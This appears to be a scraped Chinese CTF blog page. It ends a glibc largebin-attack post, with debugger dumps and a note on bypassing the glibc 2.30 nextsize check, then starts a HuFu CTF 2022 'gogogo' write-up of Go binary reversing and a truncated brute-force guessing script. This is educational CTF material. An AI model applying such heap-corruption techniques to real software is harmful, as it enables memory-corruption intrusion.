◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br><span class="line">    <span class="comment">/* (stack_var2-4)-&gt;fd_nextsize=stack_var2 */</span></span><br><span class="line">    <span class="comment">/* (stack_var1-2)-&gt;fd=stack_var1 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555b360</span> <span class="comment">/* p2 */</span></span><br><span class="line"><span class="number">0x55555555b360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x55555555b370</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055555555b8a0</span> <span class="comment">// p3</span></span><br><span class="line"><span class="number">0x55555555b380</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055555555b8a0</span> <span class="comment">// p3</span></span><br></pre></td></tr></table></figure>
<h2 id="libc-2-30-的检测"><a href="#libc-2-30-的检测" class="headerlink" title="libc-2.30 的检测"></a>libc-2.30 的检测</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>在 glibc2.29 中，增加了对双向链表完整性的检查，这样的检查方式正如同 glibc2.29 中增加的对 unsorted bin 类似，但是与其不同的是，这个检查只存在于插入的 unsorted chunk size 大于 chunk 时候，也就是说， <strong>如果我们构造一个小于所有 largebin 中堆块的 unsorted chunk，那么就可以成功利用上面那个分支操作</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size)</span><br><span class="line">    &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(chunk_main_arena(fwd));</span><br><span class="line">    <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        assert(chunk_main_arena(fwd));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size</span><br><span class="line">        == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunksize_nomask(fwd))</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/" class="post-title-link" itemprop="url">虎符CTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-25 19:20:54" itemprop="dateCreated datePublished" datetime="2022-03-25T19:20:54+08:00">2022-03-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-05 01:15:39" itemprop="dateModified" datetime="2022-12-05T01:15:39+08:00">2022-12-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>57k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>52 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./gogogo       </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gogogo: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), statically linked, Go BuildID=OPIhFHMrY<span class="number">-7U</span>FXwK1kut/ps8Q_hGCHEf-Am9x5tdv/<span class="number">3</span>tThvdTnrIvrW8jtkHHX/yCVwqchmGGNZd485XtOR, stripped</span><br><span class="line"> </span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/gogogo&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<p>输入两个数字，进入主体程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./gogogo </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br></pre></td></tr></table></figure>
<p>golang逆向出来真的难看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">main_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  _QWORD *v9; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  _QWORD v10[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v10 &lt;= *(_QWORD *)(v0 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v10[<span class="number">0</span>] = &amp;unk_49D7C0;</span><br><span class="line">  v10[<span class="number">1</span>] = &amp;off_4CFBB0;</span><br><span class="line">  fmt_Fprintln(v2);</span><br><span class="line">  fmt_Fprintln(v3);</span><br><span class="line">  runtime_newobject(v4);</span><br><span class="line">  v9 = v1;</span><br><span class="line">  fmt_Fscanf(v5);</span><br><span class="line">  <span class="keyword">if</span> ( *v9 == <span class="number">305419896LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln(v6);</span><br><span class="line">    runtime_makeslice(v7);</span><br><span class="line">    bufio___ptr_Reader__Read(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln(v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用插件初步处理后：（我用的是 IDAGolangHelper）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">main_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v2; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  _QWORD v3[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v3 &lt;= *(_QWORD *)(v0 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v3[<span class="number">0</span>] = &amp;unk_49D7C0;</span><br><span class="line">  v3[<span class="number">1</span>] = &amp;off_4CFBB0;</span><br><span class="line">  fmt_Fprintln();</span><br><span class="line">  fmt_Fprintln();</span><br><span class="line">  runtime_newobject();</span><br><span class="line">    <span class="comment">/* Go 语言的标准库函数runtime.newobject()用于在heap上的内存分配和代理runtime.mallocgc */</span></span><br><span class="line">  v2 = v1;</span><br><span class="line">  fmt_Fscanf();</span><br><span class="line">  <span class="keyword">if</span> ( *v2 == <span class="number">305419896LL</span> )</span><br><span class="line">      <span class="comment">/* fmt_Fscanf()应该是输入语句,v2应该是输入的内容 */</span></span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln();</span><br><span class="line">    runtime_makeslice();</span><br><span class="line">    bufio__ptr_Reader_Read();</span><br><span class="line">      <span class="comment">/* Reset丢弃缓冲中的数据，清除任何错误，将b重设为其下层从r读取数据 */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序提示我们输入一个数字，那么就输入“305419896”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./gogogo </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br><span class="line"><span class="number">305419896</span></span><br><span class="line">OKAY YOU CAN LEAVE YOUR NAME AND BYE~</span><br></pre></td></tr></table></figure>
<p>好像失败了，这是这么回事（不输入这个数字会直接退出）另外我还发现：</p>
<ul>
<li>在 <code>main_main</code> 中下的断点丝毫不起作用</li>
<li>IDA的伪代码中有许多 <code>fmt_Fprintf()</code> ，每个只输出一个字符</li>
<li>其中 <code>fmt_Fprintln()</code> 表示输出带有“\n”的字符串</li>
</ul>
<p>golang 会通过 <code>runtime·newproc</code> 创建 <code>runtime.main</code> 协程，然后在 <code>runtime.main</code> 里会启动 <code>main.main</code> 函数，这个就是我们平时写的那个 main 函数了 </p>
<p>因为我对 golang 的底层不熟悉，所以我选择在 <code>runtime.main</code> 处打断点，一步一步分析程序的流程</p>
<ul>
<li>结果程序在 <code>math_init</code> 中不断循环，调试不了（IDA在一步步单步执行后，又回到了原点，目前不知道为什么）</li>
<li>最后通过下断点的方式跳出了循环，并且成功发现了目标数据</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 == <span class="number">1717986918</span> )</span><br><span class="line">&#123;</span><br><span class="line">  bytes_In(); <span class="comment">/* 盲猜是输入 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v2 != <span class="number">1416925456</span> )</span><br><span class="line">&#123;</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  v139 = &amp;unk_49D7C0;</span><br><span class="line">  v140 = &amp;off_4CFC10;</span><br><span class="line">  fmt_Fprintln();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第一次输入：1717986918</li>
<li>第二次输入：1416925456</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./gogogo        </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br><span class="line"><span class="number">1717986918</span></span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br><span class="line"><span class="number">1416925456</span></span><br><span class="line">BYE~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS <span class="comment">// 7次机会</span></span><br></pre></td></tr></table></figure>
<p>进入下一阶段了，通过调试获取目标代码，下面一段大概就是了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">v138 = &amp;unk_49D7C0;</span><br><span class="line">v139 = &amp;unk_4CFC00;</span><br><span class="line">v3 = qword_551500;</span><br><span class="line">fmt_Fprintln();</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v150 = time_Now();</span><br><span class="line">    <span class="comment">/* 获取当前时间 */</span></span><br><span class="line">  v151 = v3;</span><br><span class="line">  v152 = v4;</span><br><span class="line">  math_rand__ptr_Rand_Seed();</span><br><span class="line">    <span class="comment">/* 获取随机数种子 */</span></span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">    <span class="comment">/* 输出随机数 */</span></span><br><span class="line">  v67[<span class="number">0</span>] = v5;</span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">  <span class="keyword">while</span> ( v67[<span class="number">0</span>] == v6 )</span><br><span class="line">    math_rand__ptr_Rand_Intn();</span><br><span class="line">  v74 = v6;</span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">  v8 = v67[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = v74; v8 == v7 || v7 == i; i = v74 )</span><br><span class="line">  &#123;</span><br><span class="line">    math_rand__ptr_Rand_Intn();</span><br><span class="line">    v8 = v67[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v73 = v7;</span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">  v11 = v67[<span class="number">0</span>];</span><br><span class="line">  v12 = v74;</span><br><span class="line">  <span class="keyword">for</span> ( j = v73; v11 == v10 || v10 == v12 || v10 == j; j = v73 )</span><br><span class="line">  &#123;</span><br><span class="line">    math_rand__ptr_Rand_Intn();</span><br><span class="line">    v11 = v67[<span class="number">0</span>];</span><br><span class="line">    v12 = v74;</span><br><span class="line">  &#125;</span><br><span class="line">  v71 = v10;</span><br></pre></td></tr></table></figure>
<p>很难看，但大体上了解了：这是通过“系统时间”来获取随机数，最后的输入在这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fmt_Fscanf();</span><br><span class="line">v26 = *v85;</span><br><span class="line"><span class="keyword">if</span> ( v67[<span class="number">0</span>] != *v85 ) <span class="comment">/* 盲猜v67[0]为随机数,v85就是输入值 */</span></span><br><span class="line">&#123;</span><br><span class="line">  v29 = v73;</span><br><span class="line">  v32 = v82;</span><br><span class="line">  v31 = v83;</span><br><span class="line">  v27 = v74;</span><br><span class="line">  v28 = v84;</span><br><span class="line">  v30 = v71;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_44:</span><br><span class="line">      v33 = *v28;</span><br><span class="line">      v34 = *v31;</span><br><span class="line">      v35 = *v32;</span><br><span class="line">      v36 = v67[<span class="number">0</span>] == *v28 || v67[<span class="number">0</span>] == v34 || v67[<span class="number">0</span>] == v35;</span><br><span class="line">      <span class="keyword">if</span> ( v27 == v26 || v27 == v34 || v27 == v35 )</span><br><span class="line">        ++v36;</span><br><span class="line">      <span class="keyword">if</span> ( v29 == v33 || v29 == v26 || v29 == v35 )</span><br><span class="line">        ++v36;</span><br><span class="line">      <span class="keyword">if</span> ( v30 == v26 || v30 == v34 || v30 == v33 )</span><br><span class="line">        ++v36;</span><br><span class="line">      v67[<span class="number">1</span>] = v36;</span><br><span class="line">      runtime_convT64(v64);</span><br><span class="line">      v80 = v24;</span><br><span class="line">      runtime_convT64(v65);</span><br><span class="line">      v153 = <span class="string">&quot;\b&quot;</span>;</span><br><span class="line">      v154 = v80;</span><br><span class="line">      v155 = <span class="string">&quot;\b&quot;</span>;</span><br><span class="line">      v156 = v25;</span><br><span class="line">      fmt_Fprintf();</span><br><span class="line">      v124 = &amp;unk_49D7C0;</span><br><span class="line">      v125 = &amp;unk_4CFC00;</span><br><span class="line">      v3 = qword_551500;</span><br><span class="line">      fmt_Fprintln();</span><br><span class="line">      v18 = v72 + <span class="number">1</span>;</span><br><span class="line">      v17 = v82;</span><br></pre></td></tr></table></figure>
<p>单步调试，没有看明白它的代码，但是它给出了提示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS</span><br><span class="line">$ <span class="number">6</span></span><br><span class="line"><span class="number">0</span>A1B</span><br><span class="line">$ <span class="number">999</span></span><br><span class="line"><span class="number">0</span>A0B</span><br></pre></td></tr></table></figure>
<p>0A1B？0A0B？盲猜这是程序的某种提示，组里和我同期的pwn手发现这是“1A2B游戏”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你和对手分别选定一个四位数，各位数字不要重复</span><br><span class="line">游戏开始后，由双方分别猜对方所选定的四位数，猜测的结果将会列在自己的猜测历史列表，并以A和B来表示结果</span><br><span class="line">A代表猜测的数字中，数字相同且位置也正确的个数</span><br><span class="line">B代表猜测的数字中，数字相同但位置不一样的个数</span><br><span class="line">举例来说，如果对方的数字为<span class="number">1234</span>，且你猜的数字为<span class="number">5283</span>，其中<span class="number">2</span>被猜到且位置正确，<span class="number">3</span>也被猜到但位置不对，所以结果会出现<span class="number">1</span>A1B</span><br><span class="line">比赛由先完整猜出对方数字的人获得胜利（也就是先得到<span class="number">4</span>A的玩家）</span><br></pre></td></tr></table></figure>
<p>在我的后续尝试中发现，输入的数字需要加空格：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS</span><br><span class="line">$ <span class="number">1234</span></span><br><span class="line"><span class="number">1</span>A1B</span><br><span class="line">$ <span class="number">5678</span></span><br><span class="line"><span class="number">1</span>A1B <span class="comment">/* 很明显不符合规则 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS</span><br><span class="line">$ <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span>A0B</span><br><span class="line">$ <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span></span><br><span class="line"><span class="number">0</span>A2B <span class="comment">/* 现在差不多了 */</span></span><br></pre></td></tr></table></figure>
<p>接下来就是算法的问题了，我想通过爆破所有可能性来“猜中”随机数，但是在这个过程中遇到了许多BUG，花费了我很多时间才成功，下面就是攻击脚本：（有点丑陋，但很直观）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="number">0</span></span><br><span class="line">B=<span class="number">0</span></span><br><span class="line">C=<span class="number">0</span></span><br><span class="line">D=<span class="number">0</span></span><br><span class="line">E=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">	E=E+<span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	payload=<span class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	sleep(<span class="number">0.001</span>) <span class="comment"># 